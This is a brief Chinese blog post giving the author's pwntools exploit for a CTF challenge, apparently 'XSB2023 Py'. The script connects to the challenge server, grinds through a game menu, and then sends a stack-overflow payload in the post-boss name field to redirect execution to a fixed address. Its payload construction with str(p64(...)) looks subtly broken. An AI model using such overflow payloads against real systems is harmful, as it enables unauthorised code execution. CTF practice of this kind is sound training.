---
title: XSB2023 Py
date: 2023-11-19 14:19:49
categories: CTF
tags: [PWN]
---
我的EXP

我也找对了漏洞所在，是打赢BOSS2后留名字的栈溢出。

```
from pwn import *
r = remote("47.94.85.181",22872) #连接指定IP及端口，题目给定
r.recvlines(10)       #运行到字符串位置停下

for i in range(10000):
    r.sendline("2")       #运行到字符串位置停下
    r.recvline()
    r.sendline("1")
    r.recvlines(7)   
r.sendline("2")       #运行到字符串位置停下
r.recvline()
r.sendline("2")
r.recvlines(7)   
payload = 'A' * 9 + str(p64(0x00117630))#+str(p64('flag'))+str(0x0000000000000001)+str(0x0000000000000001)#发送数据，输入数据溢出,并覆盖,返回到目标位置
r.sendline(payload)         #发送 payload
r.interactive()             #交互
```



```

```

